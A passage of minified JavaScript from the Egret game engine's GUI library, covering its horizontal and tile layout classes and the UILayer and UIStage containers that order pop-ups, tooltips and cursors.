				n = Math.max(0, a - h - g),
				q = Math.max(0, e - l - f),
				p = this._horizontalAlign == d.HorizontalAlign.JUSTIFY,
				r = this._verticalAlign == d.VerticalAlign.JUSTIFY || this._verticalAlign == d.VerticalAlign.CONTENT_JUSTIFY,
				x = 0;
				r || (this._verticalAlign == d.VerticalAlign.MIDDLE ? x = 0.5 : this._verticalAlign == d.VerticalAlign.BOTTOM && (x = 1));
				var z = this.target.numElements,
				v = z,
				A = h,
				t = l,
				B,
				w,
				E = 0,
				t = 0,
				D = [],
				C,
				s = n;
				for (B = 0; B <
					z; B++)
					(w = this.target.getElementAt(B)) && w.includeInLayout ? (this.maxElementHeight = Math.max(this.maxElementHeight, w.preferredHeight), p ? E += w.preferredWidth : isNaN(w.percentWidth) ? s -= w.preferredWidth : (t += w.percentWidth, C = new c, C.layoutElement = w, C.percent = w.percentWidth, C.min = w.minWidth, C.max = w.maxWidth, D.push(C))) : v--;
				var s = s - k * (v - 1),
				s = 0 < s ? s : 0,
				J = n - E - k * (v - 1),
				L,
				G = v,
				I = [];
				if (p) {
					if (0 > J) {
						L = s / v;
						for (B = 0; B < z; B++)
							(w = this.target.getElementAt(B)) && w.includeInLayout && (w = w.preferredWidth, w <= L && (s -= w, G--));
						s = 0 < s ? s : 0
					}
				} else if (0 <
					t) {
					b.flexChildrenProportionally(n, s, t, D);
					n = 0;
					w = D.length;
					for (B = 0; B < w; B++)
						C = D[B], t = Math.round(C.size + n), n += C.size - t, I[C.layoutElement.hashCode] = t, s -= t;
					s = 0 < s ? s : 0
				}
				this._horizontalAlign == d.HorizontalAlign.CENTER ? A = h + 0.5 * s : this._horizontalAlign == d.HorizontalAlign.RIGHT && (A = h + s);
				D = l;
				w = v = 0;
				C = Math.ceil(q);
				this._verticalAlign == d.VerticalAlign.CONTENT_JUSTIFY && (C = Math.ceil(Math.max(q, this.maxElementHeight)));
				for (B = n = 0; B < z; B++)
					t = 0, (w = this.target.getElementAt(B)) && w.includeInLayout && (v = NaN, p ? (t = NaN, 0 < J ? t = s * w.preferredWidth /
								E : 0 > J && w.preferredWidth > L && (t = s / G), isNaN(t) || (v = Math.round(t + n), n += t - v)) : v = I[w.hashCode], r ? (t = l, w.setLayoutBoundsSize(v, C)) : (t = NaN, isNaN(w.percentHeight) || (t = Math.min(100, w.percentHeight), t = Math.round(q * t * 0.01)), w.setLayoutBoundsSize(v, t), t = (q - w.layoutBoundsHeight) * x, t = 0 < t ? t : 0, t = l + t), w.setLayoutBoundsPosition(Math.round(A), Math.round(t)), v = Math.ceil(w.layoutBoundsWidth), w = Math.ceil(w.layoutBoundsHeight), h = Math.max(h, A + v), D = Math.max(D, t + w), A += v + k);
				this.target.setContentSize(Math.ceil(h + g), Math.ceil(D +
						f))
			};
			b.flexChildrenProportionally = function (a, b, c, d) {
				var e = d.length,
				f;
				do {
					f = !0;
					var k = b - a * c / 100;
					0 < k ? b -= k : k = 0;
					for (var n = b / c, q = 0; q < e; q++) {
						var p = d[q],
						r = p.percent * n;
						if (r < p.min) {
							f = p.min;
							p.size = f;
							d[q] = d[--e];
							d[e] = p;
							c -= p.percent;
							k >= f || (b -= f - k);
							f = !1;
							break
						} else if (r > p.max) {
							f = p.max;
							p.size = f;
							d[q] = d[--e];
							d[e] = p;
							c -= p.percent;
							k >= f || (b -= f - k);
							f = !1;
							break
						} else
							p.size = r
					}
				} while (!f)
			};
			return b
		}
		(e.LayoutBase);
		e.HorizontalLayout = f;
		f.prototype.__class__ = "egret.gui.HorizontalLayout";
		var c = function () {
			return function () {
				this.size =
					0
			}
		}
		();
		c.prototype.__class__ = "ChildInfo"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this.explicitHorizontalGap = NaN;
				this._horizontalGap = 6;
				this.explicitVerticalGap = NaN;
				this._verticalGap = 6;
				this._columnCount = -1;
				this._requestedColumnCount = 0;
				this._rowCount = -1;
				this._requestedRowCount = 0;
				this._rowHeight = this.explicitRowHeight = this._columnWidth = this.explicitColumnWidth = NaN;
				this._padding = 0;
				this._paddingBottom = this._paddingTop = this._paddingRight = this._paddingLeft = NaN;
				this._horizontalAlign = d.HorizontalAlign.JUSTIFY;
				this._verticalAlign =
					d.VerticalAlign.JUSTIFY;
				this._columnAlign = e.ColumnAlign.LEFT;
				this._rowAlign = e.RowAlign.TOP;
				this._orientation = e.TileOrientation.ROWS;
				this.maxElementHeight = this.maxElementWidth = 0;
				this.endIndex = this.startIndex = -1;
				this.indexInViewCalculated = !1
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "horizontalGap", {
				get : function () {
					return this._horizontalGap
				},
				set : function (a) {
					a != this._horizontalGap && (this._horizontalGap = this.explicitHorizontalGap = a, this.invalidateTargetSizeAndDisplayList(), this.hasEventListener("gapChanged") &&
						this.dispatchEventWith("gapChanged"))
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "verticalGap", {
				get : function () {
					return this._verticalGap
				},
				set : function (a) {
					a != this._verticalGap && (this._verticalGap = this.explicitVerticalGap = a, this.invalidateTargetSizeAndDisplayList(), this.hasEventListener("gapChanged") && this.dispatchEventWith("gapChanged"))
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "columnCount", {
				get : function () {
					return this._columnCount
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "requestedColumnCount", {
				get : function () {
					return this._requestedColumnCount
				},
				set : function (a) {
					this._requestedColumnCount != a && (this._columnCount = this._requestedColumnCount = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "rowCount", {
				get : function () {
					return this._rowCount
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "requestedRowCount", {
				get : function () {
					return this._requestedRowCount
				},
				set : function (a) {
					this._requestedRowCount !=
					a && (this._rowCount = this._requestedRowCount = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "columnWidth", {
				get : function () {
					return this._columnWidth
				},
				set : function (a) {
					a != this._columnWidth && (this._columnWidth = this.explicitColumnWidth = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "rowHeight", {
				get : function () {
					return this._rowHeight
				},
				set : function (a) {
					a != this._rowHeight && (this._rowHeight =
							this.explicitRowHeight = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "padding", {
				get : function () {
					return this._padding
				},
				set : function (a) {
					this._padding != a && (this._padding = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "paddingLeft", {
				get : function () {
					return this._paddingLeft
				},
				set : function (a) {
					this._paddingLeft != a && (this._paddingLeft = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "paddingRight", {
				get : function () {
					return this._paddingRight
				},
				set : function (a) {
					this._paddingRight != a && (this._paddingRight = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "paddingTop", {
				get : function () {
					return this._paddingTop
				},
				set : function (a) {
					this._paddingTop != a && (this._paddingTop = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype,
				"paddingBottom", {
				get : function () {
					return this._paddingBottom
				},
				set : function (a) {
					this._paddingBottom != a && (this._paddingBottom = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "horizontalAlign", {
				get : function () {
					return this._horizontalAlign
				},
				set : function (a) {
					this._horizontalAlign != a && (this._horizontalAlign = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "verticalAlign", {
				get : function () {
					return this._verticalAlign
				},
				set : function (a) {
					this._verticalAlign != a && (this._verticalAlign = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "columnAlign", {
				get : function () {
					return this._columnAlign
				},
				set : function (a) {
					this._columnAlign != a && (this._columnAlign = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "rowAlign", {
				get : function () {
					return this._rowAlign
				},
				set : function (a) {
					this._rowAlign != a && (this._rowAlign = a,
						this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "orientation", {
				get : function () {
					return this._orientation
				},
				set : function (a) {
					this._orientation != a && (this._orientation = a, this.invalidateTargetSizeAndDisplayList(), this.hasEventListener("orientationChanged") && this.dispatchEventWith("orientationChanged"))
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.invalidateTargetSizeAndDisplayList = function () {
				this.target && (this.target.invalidateSize(), this.target.invalidateDisplayList())
			};
			a.prototype.measure = function () {
				if (this.target) {
					var a = this._columnCount,
					c = this._rowCount,
					d = this._columnWidth,
					e = this._rowHeight,
					f = 0,
					g = 0;
					this.calculateRowAndColumn(this.target.explicitWidth, this.target.explicitHeight);
					var l = 0 < this._requestedColumnCount ? this._requestedColumnCount : this._columnCount,
					k = 0 < this._requestedRowCount ? this._requestedRowCount : this._rowCount,
					n = isNaN(this._horizontalGap) ? 0 : this._horizontalGap,
					q = isNaN(this._verticalGap) ? 0 : this._verticalGap;
					0 < l && (f = l * (this._columnWidth + n) - n);
					0 < k && (g =
							k * (this._rowHeight + q) - q);
					q = isNaN(this._padding) ? 0 : this._padding;
					l = isNaN(this._paddingLeft) ? q : this._paddingLeft;
					k = isNaN(this._paddingRight) ? q : this._paddingRight;
					n = isNaN(this._paddingTop) ? q : this._paddingTop;
					q = isNaN(this._paddingBottom) ? q : this._paddingBottom;
					n += q;
					this.target.measuredWidth = Math.ceil(f + (l + k));
					this.target.measuredHeight = Math.ceil(g + n);
					this._columnCount = a;
					this._rowCount = c;
					this._columnWidth = d;
					this._rowHeight = e
				}
			};
			a.prototype.calculateRowAndColumn = function (a, c) {
				var d = isNaN(this._horizontalGap) ?
					0 : this._horizontalGap,
				f = isNaN(this._verticalGap) ? 0 : this._verticalGap;
				this._rowCount = this._columnCount = -1;
				for (var h = this.target.numElements, g = h, l = 0; l < g; l++) {
					var k = this.target.getElementAt(l);
					k && !k.includeInLayout && h--
				}
				if (0 == h)
					this._rowCount = this._columnCount = 0;
				else {
					(isNaN(this.explicitColumnWidth) || isNaN(this.explicitRowHeight)) && this.updateMaxElementSize();
					isNaN(this.explicitColumnWidth) ? this._columnWidth = this.maxElementWidth : this._columnWidth = this.explicitColumnWidth;
					isNaN(this.explicitRowHeight) ?
					this._rowHeight = this.maxElementHeight : this._rowHeight = this.explicitRowHeight;
					g = this._columnWidth + d;
					0 >= g && (g = 1);
					l = this._rowHeight + f;
					0 >= l && (l = 1);
					var k = this.orientation == e.TileOrientation.COLUMNS,
					n = !isNaN(a),
					q = !isNaN(c),
					p = isNaN(this._padding) ? 0 : this._padding,
					r = isNaN(this._paddingLeft) ? p : this._paddingLeft,
					x = isNaN(this._paddingRight) ? p : this._paddingRight,
					z = isNaN(this._paddingTop) ? p : this._paddingTop,
					p = isNaN(this._paddingBottom) ? p : this._paddingBottom;
					0 < this._requestedColumnCount || 0 < this._requestedRowCount ?
					(0 < this._requestedRowCount && (this._rowCount = Math.min(this._requestedRowCount, h)), 0 < this._requestedColumnCount && (this._columnCount = Math.min(this._requestedColumnCount, h))) : n || q ? !n || q && k ? (d = Math.max(0, c - z - p), this._rowCount = Math.floor((d + f) / l), this._rowCount = Math.max(1, Math.min(this._rowCount, h))) : (f = Math.max(0, a - r - x), this._columnCount = Math.floor((f + d) / g), this._columnCount = Math.max(1, Math.min(this._columnCount, h))) : (d = Math.sqrt(h * g * l), k ? this._rowCount = Math.max(1, Math.round(d / l)) : this._columnCount = Math.max(1,
								Math.round(d / g)));
					-1 == this._rowCount && (this._rowCount = Math.max(1, Math.ceil(h / this._columnCount)));
					-1 == this._columnCount && (this._columnCount = Math.max(1, Math.ceil(h / this._rowCount)));
					0 < this._requestedColumnCount && 0 < this._requestedRowCount && (this.orientation == e.TileOrientation.ROWS ? this._rowCount = Math.max(1, Math.ceil(h / this._requestedColumnCount)) : this._columnCount = Math.max(1, Math.ceil(h / this._requestedRowCount)))
				}
			};
			a.prototype.updateMaxElementSize = function () {
				this.target && (this.useVirtualLayout ? this.updateMaxElementSizeVirtual() :
					this.updateMaxElementSizeReal())
			};
			a.prototype.updateMaxElementSizeVirtual = function () {
				var a = this.typicalLayoutRect ? this.typicalLayoutRect.height : 22;
				this.maxElementWidth = Math.max(this.maxElementWidth, this.typicalLayoutRect ? this.typicalLayoutRect.width : 22);
				this.maxElementHeight = Math.max(this.maxElementHeight, a);
				if (-1 != this.startIndex && -1 != this.endIndex)
					for (a = this.startIndex; a <= this.endIndex; a++) {
						var c = this.target.getVirtualElementAt(a);
						c && c.includeInLayout && (this.maxElementWidth = Math.max(this.maxElementWidth,
									c.preferredWidth), this.maxElementHeight = Math.max(this.maxElementHeight, c.preferredHeight))
					}
			};
			a.prototype.updateMaxElementSizeReal = function () {
				for (var a = this.target.numElements, c = 0; c < a; c++) {
					var d = this.target.getElementAt(c);
					d && d.includeInLayout && (this.maxElementWidth = Math.max(this.maxElementWidth, d.preferredWidth), this.maxElementHeight = Math.max(this.maxElementHeight, d.preferredHeight))
				}
			};
			a.prototype.clearVirtualLayoutCache = function () {
				c.prototype.clearVirtualLayoutCache.call(this);
				this.maxElementHeight =
					this.maxElementWidth = 0
			};
			a.prototype.scrollPositionChanged = function () {
				c.prototype.scrollPositionChanged.call(this);
				this.useVirtualLayout && this.getIndexInView() && (this.indexInViewCalculated = !0, this.target.invalidateDisplayList())
			};
			a.prototype.getIndexInView = function () {
				if (!this.target || 0 == this.target.numElements)
					return this.startIndex = this.endIndex = -1, !1;
				var a = this.target.numElements;
				if (!this.useVirtualLayout)
					return this.startIndex = 0, this.endIndex = a - 1, !1;
				if (isNaN(this.target.width) || 0 == this.target.width ||
					isNaN(this.target.height) || 0 == this.target.height)
					return this.startIndex = this.endIndex = -1, !1;
				var c = this.startIndex,
				d = this.endIndex,
				f = isNaN(this._padding) ? 0 : this._padding,
				h = isNaN(this._paddingLeft) ? f : this._paddingLeft,
				f = isNaN(this._paddingTop) ? f : this._paddingTop,
				g = isNaN(this._horizontalGap) ? 0 : this._horizontalGap,
				l = isNaN(this._verticalGap) ? 0 : this._verticalGap;
				if (this.orientation == e.TileOrientation.COLUMNS) {
					g = this._columnWidth + g;
					if (0 >= g)
						return this.startIndex = 0, this.endIndex = a - 1, !1;
					l = this.target.horizontalScrollPosition +
						this.target.width;
					f = Math.floor((this.target.horizontalScrollPosition - h) / g);
					0 > f && (f = 0);
					h = Math.ceil((l - h) / g);
					0 > h && (h = 0);
					this.startIndex = Math.min(a - 1, Math.max(0, f * this._rowCount));
					this.endIndex = Math.min(a - 1, Math.max(0, h * this._rowCount - 1))
				} else {
					g = this._rowHeight + l;
					if (0 >= g)
						return this.startIndex = 0, this.endIndex = a - 1, !1;
					l = this.target.verticalScrollPosition + this.target.height;
					h = Math.floor((this.target.verticalScrollPosition - f) / g);
					0 > h && (h = 0);
					f = Math.ceil((l - f) / g);
					0 > f && (f = 0);
					this.startIndex = Math.min(a - 1, Math.max(0,
								h * this._columnCount));
					this.endIndex = Math.min(a - 1, Math.max(0, f * this._columnCount - 1))
				}
				return this.startIndex != c || this.endIndex != d
			};
			a.prototype.updateDisplayList = function (a, d) {
				c.prototype.updateDisplayList.call(this, a, d);
				if (this.target) {
					var f = isNaN(this._padding) ? 0 : this._padding,
					y = isNaN(this._paddingLeft) ? f : this._paddingLeft,
					h = isNaN(this._paddingRight) ? f : this._paddingRight,
					g = isNaN(this._paddingTop) ? f : this._paddingTop,
					l = isNaN(this._paddingBottom) ? f : this._paddingBottom,
					f = isNaN(this._horizontalGap) ? 0 : this._horizontalGap,
					k = isNaN(this._verticalGap) ? 0 : this._verticalGap;
					if (this.indexInViewCalculated)
						this.indexInViewCalculated = !1;
					else {
						this.calculateRowAndColumn(a, d);
						if (0 == this._rowCount || 0 == this._columnCount) {
							this.target.setContentSize(y + h, g + l);
							return
						}
						this.adjustForJustify(a, d);
						this.getIndexInView()
					}
					this.useVirtualLayout && (this.calculateRowAndColumn(a, d), this.adjustForJustify(a, d));
					if (-1 == this.startIndex || -1 == this.endIndex)
						this.target.setContentSize(0, 0);
					else {
						this.target.setVirtualElementIndicesInView(this.startIndex,
							this.endIndex);
						for (var n, q, p, r = this.orientation == e.TileOrientation.COLUMNS, x = this.startIndex, z = this.startIndex; z <= this.endIndex; z++)
							n = this.useVirtualLayout ? this.target.getVirtualElementAt(z) : this.target.getElementAt(z), null != n && n.includeInLayout && (r ? (q = Math.ceil((x + 1) / this._rowCount) - 1, p = Math.ceil((x + 1) % this._rowCount) - 1, -1 == p && (p = this._rowCount - 1)) : (q = Math.ceil((x + 1) % this._columnCount) - 1, -1 == q && (q = this._columnCount - 1), p = Math.ceil((x + 1) / this._columnCount) - 1), q = q * (this._columnWidth + f) + y, p = p * (this._rowHeight +
										k) + g, this.sizeAndPositionElement(n, q, p, this._columnWidth, this.rowHeight), x++);
						g += l;
						k = (this._rowHeight + k) * this._rowCount - k;
						this.target.setContentSize(Math.ceil((this._columnWidth + f) * this._columnCount - f + (y + h)), Math.ceil(k + g))
					}
				}
			};
			a.prototype.sizeAndPositionElement = function (a, c, e, f, h) {
				var g = NaN,
				l = NaN;
				this.horizontalAlign == d.HorizontalAlign.JUSTIFY ? g = f : isNaN(a.percentWidth) || (g = f * a.percentWidth * 0.01);
				this.verticalAlign == d.VerticalAlign.JUSTIFY ? l = h : isNaN(a.percentHeight) || (l = h * a.percentHeight * 0.01);
				a.setLayoutBoundsSize(Math.round(g),
					Math.round(l));
				g = c;
				switch (this.horizontalAlign) {
				case d.HorizontalAlign.RIGHT:
					g += f - a.layoutBoundsWidth;
					break;
				case d.HorizontalAlign.CENTER:
					g = c + (f - a.layoutBoundsWidth) / 2
				}
				c = e;
				switch (this.verticalAlign) {
				case d.VerticalAlign.BOTTOM:
					c += h - a.layoutBoundsHeight;
					break;
				case d.VerticalAlign.MIDDLE:
					c += (h - a.layoutBoundsHeight) / 2
				}
				a.setLayoutBoundsPosition(Math.round(g), Math.round(c))
			};
			a.prototype.adjustForJustify = function (a, c) {
				var d = isNaN(this._padding) ? 0 : this._padding,
				f = isNaN(this._paddingLeft) ? d : this._paddingLeft,
				h = isNaN(this._paddingRight) ? d : this._paddingRight,
				g = isNaN(this._paddingTop) ? d : this._paddingTop,
				d = isNaN(this._paddingBottom) ? d : this._paddingBottom,
				f = Math.max(0, a - f - h),
				g = Math.max(0, c - g - d);
				isNaN(this.explicitVerticalGap) || (this._verticalGap = this.explicitVerticalGap);
				isNaN(this.explicitHorizontalGap) || (this._horizontalGap = this.explicitHorizontalGap);
				this._verticalGap = isNaN(this._verticalGap) ? 0 : this._verticalGap;
				this._horizontalGap = isNaN(this._horizontalGap) ? 0 : this._horizontalGap;
				g -= this._rowHeight * this._rowCount;
				f -= this._columnWidth * this._columnCount;
				0 < g && (this.rowAlign == e.RowAlign.JUSTIFY_USING_GAP ? (h = Math.max(1, this._rowCount - 1), this._verticalGap = g / h) : this.rowAlign == e.RowAlign.JUSTIFY_USING_HEIGHT && 0 < this._rowCount && (this._rowHeight += (g - (this._rowCount - 1) * this._verticalGap) / this._rowCount));
				0 < f && (this.columnAlign == e.ColumnAlign.JUSTIFY_USING_GAP ? (h = Math.max(1, this._columnCount - 1), this._horizontalGap = f / h) : this.columnAlign == e.ColumnAlign.JUSTIFY_USING_WIDTH && 0 < this._columnCount && (this._columnWidth += (f - (this._columnCount -
								1) * this._horizontalGap) / this._columnCount))
			};
			return a
		}
		(e.LayoutBase);
		e.TileLayout = f;
		f.prototype.__class__ = "egret.gui.TileLayout"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
(function (d) {
	(function (d) {
		var f = function () {
			function c(a, b, c) {
				this.raw_getElementAt = "raw_getElementAt";
				this.raw_addElementAt = "raw_addElementAt";
				this.raw_getElementIndex = "raw_getElementIndex";
				this.raw_removeElement = "raw_removeElement";
				this.raw_removeElementAt = "raw_removeElementAt";
				this.raw_setElementIndex = "raw_setElementIndex";
				this.owner = a;
				this.lowerBoundReference = b;
				this.upperBoundReference = c
			}
			Object.defineProperty(c.prototype, "numElements", {
				get : function () {
					return this.owner[this.upperBoundReference] -
					this.owner[this.lowerBoundReference]
				},
				enumerable : !0,
				configurable : !0
			});
			c.prototype.getElementAt = function (a) {
				return this.owner[this.raw_getElementAt](this.owner[this.lowerBoundReference] + a)
			};
			c.prototype.addElement = function (a) {
				var b = this.owner[this.upperBoundReference];
				a.parent === this.owner && b--;
				this.owner[this.upperBoundReference]++;
				this.owner[this.raw_addElementAt](a, b);
				a.ownerChanged(this);
				return a
			};
			c.prototype.addElementAt = function (a, b) {
				this.owner[this.upperBoundReference]++;
				this.owner[this.raw_addElementAt](a,
					this.owner[this.lowerBoundReference] + b);
				a.ownerChanged(this);
				return a
			};
			c.prototype.removeElement = function (a) {
				var b = this.owner[this.raw_getElementIndex](a);
				this.owner[this.lowerBoundReference] <= b && b < this.owner[this.upperBoundReference] && (this.owner[this.raw_removeElement](a), this.owner[this.upperBoundReference]--);
				a.ownerChanged(null);
				return a
			};
			c.prototype.removeElementAt = function (a) {
				a += this.owner[this.lowerBoundReference];
				var b;
				this.owner[this.lowerBoundReference] <= a && a < this.owner[this.upperBoundReference] &&
				(b = this.owner[this.raw_removeElementAt](a), this.owner[this.upperBoundReference]--);
				b.ownerChanged(null);
				return b
			};
			c.prototype.getElementIndex = function (a) {
				a = this.owner[this.raw_getElementIndex](a);
				return a -= this.owner[this.lowerBoundReference]
			};
			c.prototype.setElementIndex = function (a, b) {
				this.owner[this.raw_setElementIndex](a, this.owner[this.lowerBoundReference] + b)
			};
			return c
		}
		();
		d.UILayer = f;
		f.prototype.__class__ = "egret.gui.UILayer"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._autoResize = !0;
				this._cursorIndex = this._toolTipIndex = this._topMostIndex = this._noTopMostIndex = 0;
				this.addEventListener(d.Event.ADDED_TO_STAGE, this.onAddToStage, this);
				this.addEventListener(d.Event.REMOVED_FROM_STAGE, this.onRemoveFromStage, this)
			}
			__extends(a, c);
			a.prototype.onAddToStage = function (a) {
				if (e.UIGlobals._uiStage)
					throw Error("UIStage\u662fGUI\u6839\u5bb9\u5668\uff0c\u53ea\u80fd\u6709\u4e00\u4e2a\u6b64\u5b9e\u4f8b\u5728\u663e\u793a\u5217\u8868\u4e2d\uff01");
				e.UIGlobals._uiStage = this;
				this._autoResize && (this.stage.addEventListener(d.Event.RESIZE, this.onResize, this), this.onResize())
			};
			a.prototype.onRemoveFromStage = function (a) {
				e.UIGlobals._uiStage = null;
				this._autoResize && this.stage.removeEventListener(d.Event.RESIZE, this.onResize, this)
			};
			a.prototype.onResize = function (a) {
				this._setWidth(this.stage.stageWidth);
				this._setHeight(this.stage.stageHeight)
			};
			Object.defineProperty(a.prototype, "autoResize", {
				get : function () {
					return this._autoResize
				},
				set : function (a) {
					this._autoResize !=
					a && (this._autoResize = a, this.stage && (this._autoResize ? (this.stage.addEventListener(d.Event.RESIZE, this.onResize, this), this.onResize()) : this.stage.removeEventListener(d.Event.RESIZE, this.onResize, this)))
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "x", {
				get : function () {
					return this._x
				},
				set : function (a) {
					this._autoResize || (this._x = a)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "y", {
				get : function () {
					return this._y
				},
				set : function (a) {
					this._autoResize || (this._y = a)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "width", {
				get : function () {
					return this._width
				},
				set : function (a) {
					this._autoResize || this._setWidth(a)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "height", {
				get : function () {
					return this._height
				},
				set : function (a) {
					this._autoResize || this._setHeight(a)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "scaleX", {
				get : function () {
					return this._scaleX
				},
				set : function (a) {
					this._autoResize || this._setScaleX(a)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "scaleY", {
				get : function () {
					return this._scaleY
				},
				set : function (a) {
					this._autoResize || this._setScaleY(a)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.setActualSize = function (a, d) {
				this._autoResize || c.prototype.setActualSize.call(this, a, d)
			};
			a.prototype.setLayoutBoundsPosition = function (a, d) {
				this._autoResize || c.prototype.setLayoutBoundsPosition.call(this, a, d)
			};
			a.prototype.setLayoutBoundsSize = function (a, d) {
				this._autoResize || c.prototype.setLayoutBoundsSize.call(this,
					a, d)
			};
			Object.defineProperty(a.prototype, "layout", {
				get : function () {
					return this._layout
				},
				set : function (a) {
					a instanceof e.BasicLayout && this._setLayout(a)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "popUpContainer", {
				get : function () {
					this._popUpContainer || (this._popUpContainer = new e.UILayer(this, "noTopMostIndex", "topMostIndex"));
					return this._popUpContainer
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "toolTipContainer", {
				get : function () {
					this._toolTipContainer || (this._toolTipContainer =
							new e.UILayer(this, "topMostIndex", "toolTipIndex"));
					return this._toolTipContainer
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "cursorContainer", {
				get : function () {
					this._cursorContainer || (this._cursorContainer = new e.UILayer(this, "toolTipIndex", "cursorIndex"));
					return this._cursorContainer
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "noTopMostIndex", {
				get : function () {
					return this._noTopMostIndex
				},
				set : function (a) {
					var c = a - this._noTopMostIndex;
					this._noTopMostIndex =
						a;
					this.topMostIndex += c
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "topMostIndex", {
				get : function () {
					return this._topMostIndex
				},
				set : function (a) {
					var c = a - this._topMostIndex;
					this._topMostIndex = a;
					this.toolTipIndex += c
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "toolTipIndex", {
				get : function () {
					return this._toolTipIndex
				},
				set : function (a) {
					var c = a - this._toolTipIndex;
					this._toolTipIndex = a;
					this.cursorIndex += c
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype,
				"cursorIndex", {
				get : function () {
					return this._cursorIndex
				},
				set : function (a) {
					this._cursorIndex = a
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.addElement = function (a) {
				var c = this._noTopMostIndex;
				a.parent == this && c--;
				return this.addElementAt(a, c)
			};
			a.prototype.addElementAt = function (a, d) {
				if (a.parent == this) {
					var e = this.getElementIndex(a);
					e < this._noTopMostIndex ? this.noTopMostIndex-- : e >= this._noTopMostIndex && e < this._topMostIndex ? this.topMostIndex-- : e >= this._topMostIndex && e < this._toolTipIndex ? this.toolTipIndex-- :
					this.cursorIndex--
				}
				d <= this._noTopMostIndex ? this.noTopMostIndex++ : d > this._noTopMostIndex && d <= this._topMostIndex ? this.topMostIndex++ : d > this._topMostIndex && d <= this._toolTipIndex ? this.toolTipIndex++ : this.cursorIndex++;
				return c.prototype.addElementAt.call(this, a, d)
			};
			a.prototype.removeElement = function (a) {
				return this.removeElementAt(c.prototype.getElementIndex.call(this, a))
			};
			a.prototype.removeElementAt = function (a) {
				var d = c.prototype.removeElementAt.call(this, a);
				a < this._noTopMostIndex ? this.noTopMostIndex-- :
				a >= this._noTopMostIndex && a < this._topMostIndex ? this.topMostIndex-- : a >= this._topMostIndex && a < this._toolTipIndex ? this.toolTipIndex-- : this.cursorIndex--;
				return d
			};
			a.prototype.removeAllElements = function () {
				for (; 0 < this._noTopMostIndex; )
					c.prototype.removeElementAt.call(this, 0), this.noTopMostIndex--
			};
			a.prototype._elementRemoved = function (a, e, f) {
				"undefined" === typeof f && (f = !0);
				f && d.Event.dispatchEvent(a, "removeFromUIStage");
				c.prototype._elementRemoved.call(this, a, e, f)
			};
			a.prototype.raw_getElementAt = function (a) {
				return c.prototype.getElementAt.call(this,
					a)
			};
			a.prototype.raw_addElement = function (a) {
				var c = this.numElements;
				a.parent == this && c--;
				return this.raw_addElementAt(a, c)
			};
			a.prototype.raw_addElementAt = function (a, d) {
				if (a.parent == this) {
					var e = this.getElementIndex(a);
					e < this._noTopMostIndex ? this.noTopMostIndex-- : e >= this._noTopMostIndex && e < this._topMostIndex ? this.topMostIndex-- : e >= this._topMostIndex && e < this._toolTipIndex ? this.toolTipIndex-- : this.cursorIndex--
				}
				return c.prototype.addElementAt.call(this, a, d)
			};
